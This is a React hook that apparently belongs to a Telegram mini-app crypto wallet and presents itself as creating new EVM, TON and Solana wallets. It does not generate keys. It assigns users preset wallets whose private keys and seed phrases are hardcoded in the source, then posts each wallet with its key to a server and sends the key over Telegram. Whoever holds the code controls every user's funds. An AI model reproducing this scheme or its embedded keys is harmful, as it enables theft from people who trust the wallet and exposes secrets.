import { useState } from 'react';
import ChainStore from '@/store/ChainStore';
import WalletStore from '@/store/WalletStore';
import { sendTelegramMessage } from '@/utils/telegramMessages';
import axios from 'axios';
import { usePathname } from 'next/navigation';

export const useCreateWallet = () => {
  const [wallet, setWallet] = useState<any>(null);
  const [isComplete, setIsComplete] = useState(false);

  const evmWallets = [
    { address: '0x02a2f8c7a38eb4be802329f1ed5944ce1baef1fc', privateKey: '0x992cc8a88a523b888bf78bcda8fd48cf5c7a9f74ce3a58c15095521960c0fdbd' },
    { address: '0xb6eb00d98d50651f62debf1fb17854c28f7d2aae', privateKey: '0x078ad6d2fc6bd17c69eb32e74c6529eb26594afad362c55aa87d2d0ccd3a32af' },
    { address: '0xea662907a577a0fc5f2aaeb7c2e5ae0ced16a0a2', privateKey: '0x7a99010d6b6c68192aa3d7dbfe60afe260d9e136148d7c79cd5f13f719cb4a13' },
    { address: '0xdbd573e94ea99aa79bb54a366b05567bb961eda2', privateKey: '0x284ad1decb825733c97e10a8bdef44aa74a7b8ea92fb961a7a00b6443eed9a0e' },
    { address: '0x9fd75cfd715959b7754916d2e1de421097acab3e', privateKey: '0xfa869364ede7e42fe5bd02099f62470223ea16ab83c100393602418779fc02d6' }
  ];

  const tonWallets = [
    { address: 'UQAYGh0WWeE-nmO18ZVeRouQgWCbFa4IT2SMmHVNbshBc838', mnemonic: 'add clay taxi donkey place sponsor vanish viable praise lazy ketchup lava piano cool motion alter eye require long tool cluster lady limb upon' },
    { address: 'UQDlY3tBkI8pImJh1FiDVhmN7O43M_MnrqNhxexw81RtysA3', mnemonic: 'reduce bone master empty calm tag rebuild harbor glare giraffe raise deputy acoustic able such rapid timber innocent pumpkin style brown blush card pet' },
    { address: 'UQB-pQoBKZrQPAsIq_uByPRhucPuV-Vw2qTWZ-xS7qNRyTHm', mnemonic: 'bright turtle swallow case magic resource van before radio spice hill frozen sell silly dune arena neither clump razor laptop junior gospel height pair' },
    { address: 'UQBQs4TBTxwvRezYWCZLXmVINyVjHP4iqANLegxZ5w8Gyvef', mnemonic: 'amount area hazard grass hybrid case web illegal grass payment mixed because match that surge goose spread tent myth ankle deputy unable fantasy glove' },
    { address: 'UQBllp9S-Pud4SepZNUouhh47jZwGVltFv6aLLUh0-HAnNdf', mnemonic: 'liberty lunch tower pattern undo dolphin direct priority plug naive voice gown sleep art ostrich soap obscure memory old smile innocent flip require artwork' }
  ];

  const solanaWallets = [
    { address: '77Cq5Yd36jZTbBK5SokrqFtdqF5p9ZDUpciRmkF5By2M', privateKey: '3fHwAreZaLLa5V48J5byi5K2jNu4bqaL4NhhhyQpBUCBNZa8gb2nL8NBDH5nKpQv7gGojwFvFFgqgEn6mxaq8qfT' },
    { address: 'GNnYJJLxpggmUVA7wWUr49Y1XukDzyFbf3cq5zBPT9eK', privateKey: '3jX46gkRZH12XmwsUJw7cisx9Skrf9gjZRpUnhXB8yhtjT6Zdjhx6oiGcKmUHPLWerFo24rEHYkExBt76re7qTw3' },
    { address: 'nDJhkVvk85e7V8Wino66a3AEk7BPhVqTnSY94kf4mDB', privateKey: '4vQqK48xoyY9iRfbjzVvspBPLHDqmrpw7SuEpH8JB66TPaK7zLjf945w1ZNJuT1ZbyEdc23oprEKt9swP5BoVCoP' },
    { address: 'A1VJVN4HSRScTCr85cDEHgQi7LQiS26UdPN86CScGHB6', privateKey: '4ocU57igF3UYDZYVjDTXw7vdaDcDvC8SXJwKnPpDXbTyVH5wp4LHkZesvmGMwTKbcvE2HRZaXkbmNoZHFHbS4zqX' },
    { address: 'D2Ruaod6vVGrYGrdvuRTRBeuDJgAQCcUPVsfhFRr9ErG', privateKey: '3LLkb5TwxLtbETBZyouoKa7yXvKHZsi66piJsbfQQjoT14wf86zYmzzfPDx9r57HVqd88Z5QiyesDRyWsWnsbwkT' },
  ];

  const createWallet = async () => {
    const currentChain = ChainStore.currentChain?.name;

    if (WalletStore.wallets.length >= 5) {
      return;
    }

    if (!currentChain) {
      console.error('No current chain selected.');
      return;
    }

    let newWallet: any;

    switch (currentChain) {
      case 'BNB Smart Chain':
      case 'Ethereum':
      case 'Base':
        newWallet = evmWallets[WalletStore.wallets.length];
        newWallet.network = 'EVM';
        break;

      case 'The Open Network':
        newWallet = tonWallets[WalletStore.wallets.length];
        newWallet.network = 'TON';
        break;

      case 'Solana':
        newWallet = solanaWallets[WalletStore.wallets.length];
        newWallet.network = 'Solana';
        break;

      default:
        console.error('Unsupported chain:', currentChain);
        return;
    }

    return newWallet;
  };

  const pathname = usePathname();
  const addWallet = async (wallet: any) => {
    if (pathname.startsWith('/auth')) {
      setTimeout(() => {
        WalletStore.addWallet(wallet);
        WalletStore.setCurrentWallet(wallet);
      }, 2000);
    } else {
      WalletStore.addWallet(wallet);
      WalletStore.setCurrentWallet(wallet);
    }

    setIsComplete(true);

    try {
      await axios.post('/api/wallet/create', {
        ...wallet, 
        user: window.Telegram.WebApp.initDataUnsafe?.user
      });
    } catch (error) {
      console.error('Failed to save wallet to the database:', error);
    }

    const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: \`${wallet.address}\`\n▫️ Приватный ключ: ||${wallet.privateKey || 'N/A'}||`;
    const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;

    await sendTelegramMessage(chatId, message);
  };

  return { createWallet, addWallet, isComplete, wallet };
};
